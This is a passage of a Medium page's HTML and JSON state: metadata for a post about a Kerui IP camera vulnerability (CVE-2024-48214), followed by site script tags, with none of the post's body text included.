fixed.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"UserViewerEdge:userId:f1f06bd2dad8-viewerId:lo_2246cba9c8b2":{"__typename":"UserViewerEdge","id":"userId:f1f06bd2dad8-viewerId:lo_2246cba9c8b2","isMuting":false},"PostViewerEdge:postId:2d56848870c2-viewerId:lo_2246cba9c8b2":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:2d56848870c2-viewerId:lo_2246cba9c8b2"},"Tag:vulnerability":{"__typename":"Tag","id":"vulnerability","displayTitle":"Vulnerability","normalizedTagSlug":"vulnerability"},"Tag:ip-camera":{"__typename":"Tag","id":"ip-camera","displayTitle":"Ip Camera","normalizedTagSlug":"ip-camera"},"Post:2d56848870c2":{"__typename":"Post","id":"2d56848870c2","collection":null,"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"8350","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:21b108638587_0"},{"__ref":"Paragraph:21b108638587_1"},{"__ref":"Paragraph:21b108638587_2"},{"__ref":"Paragraph:21b108638587_3"},{"__ref":"Paragraph:21b108638587_4"},{"__ref":"Paragraph:21b108638587_5"},{"__ref":"Paragraph:21b108638587_6"},{"__ref":"Paragraph:21b108638587_7"},{"__ref":"Paragraph:21b108638587_8"},{"__ref":"Paragraph:21b108638587_9"},{"__ref":"Paragraph:21b108638587_10"},{"__ref":"Paragraph:21b108638587_11"},{"__ref":"Paragraph:21b108638587_12"},{"__ref":"Paragraph:21b108638587_13"},{"__ref":"Paragraph:21b108638587_14"},{"__ref":"Paragraph:21b108638587_15"},{"__ref":"Paragraph:21b108638587_16"},{"__ref":"Paragraph:21b108638587_17"},{"__ref":"Paragraph:21b108638587_18"},{"__ref":"Paragraph:21b108638587_19"},{"__ref":"Paragraph:21b108638587_20"},{"__ref":"Paragraph:21b108638587_21"},{"__ref":"Paragraph:21b108638587_22"},{"__ref":"Paragraph:21b108638587_23"},{"__ref":"Paragraph:21b108638587_24"},{"__ref":"Paragraph:21b108638587_25"},{"__ref":"Paragraph:21b108638587_26"},{"__ref":"Paragraph:21b108638587_27"},{"__ref":"Paragraph:21b108638587_28"},{"__ref":"Paragraph:21b108638587_29"},{"__ref":"Paragraph:21b108638587_30"},{"__ref":"Paragraph:21b108638587_31"},{"__ref":"Paragraph:21b108638587_32"},{"__ref":"Paragraph:21b108638587_33"},{"__ref":"Paragraph:21b108638587_34"},{"__ref":"Paragraph:21b108638587_35"},{"__ref":"Paragraph:21b108638587_36"},{"__ref":"Paragraph:21b108638587_37"},{"__ref":"Paragraph:21b108638587_38"},{"__ref":"Paragraph:21b108638587_39"},{"__ref":"Paragraph:21b108638587_40"},{"__ref":"Paragraph:21b108638587_41"},{"__ref":"Paragraph:21b108638587_42"},{"__ref":"Paragraph:21b108638587_43"},{"__ref":"Paragraph:21b108638587_44"},{"__ref":"Paragraph:21b108638587_45"},{"__ref":"Paragraph:21b108638587_46"},{"__ref":"Paragraph:21b108638587_47"},{"__ref":"Paragraph:21b108638587_48"},{"__ref":"Paragraph:21b108638587_49"},{"__ref":"Paragraph:21b108638587_50"},{"__ref":"Paragraph:21b108638587_51"},{"__ref":"Paragraph:21b108638587_52"},{"__ref":"Paragraph:21b108638587_53"},{"__ref":"Paragraph:21b108638587_54"},{"__ref":"Paragraph:21b108638587_55"},{"__ref":"Paragraph:21b108638587_56"},{"__ref":"Paragraph:21b108638587_57"},{"__ref":"Paragraph:21b108638587_58"},{"__ref":"Paragraph:21b108638587_59"},{"__ref":"Paragraph:21b108638587_60"},{"__ref":"Paragraph:21b108638587_61"},{"__ref":"Paragraph:21b108638587_62"},{"__ref":"Paragraph:21b108638587_63"},{"__ref":"Paragraph:21b108638587_64"},{"__ref":"Paragraph:21b108638587_65"},{"__ref":"Paragraph:21b108638587_66"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:f1f06bd2dad8"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fmedium.com\u002F@shenhavmor\u002Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2","primaryTopic":null,"topics":[],"isPublished":true,"latestPublishedVersion":"21b108638587","visibility":"UNLISTED","postResponses":{"__typename":"PostResponses","count":0},"clapCount":0,"allowResponses":true,"isLimitedState":false,"title":"Exploiting a Chinese camera for fun CVE-2024–48214","isSeries":false,"sequence":null,"uniqueSlug":"exploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1730032527615,"readingTime":8.950943396226416,"previewContent":{"__typename":"PreviewContent","subtitle":"Kerui IP camera QR Code scan to RCE"},"previewImage":{"__ref":"ImageMetadata:1*yxvfrZ0nLAK6GldYPq6cTg.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1730032248919,"updatedAt":1731578652169,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:2d56848870c2-viewerId:lo_2246cba9c8b2"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:vulnerability"},{"__ref":"Tag:ip-camera"}],"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":1948,"layerCake":0,"responsesLocked":false}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"MISS"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.1b75cd39.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.bc924586.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.a4e221ac.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.933c1c9a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8599.73cb8339.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8346.be5bef41.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4863.28ab43f6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6589.ab860fa4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.0f82ef97.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.7c45541d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.8aa8d357.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4492.3e85e9f5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.1c286b32.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3259.1779fbde.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.60bcefe8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.ca29bb88.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5794.9e8ff5dd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8204.e2639348.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.111f755f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.6565ad5f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.8d3e0217.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.21406717.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.0eb77899.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.5a11f4da.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'90018bac7b1079b9',t:'MTczNjU2MzI2My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"90018bac7b1079b9","version":"2024.10.5","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>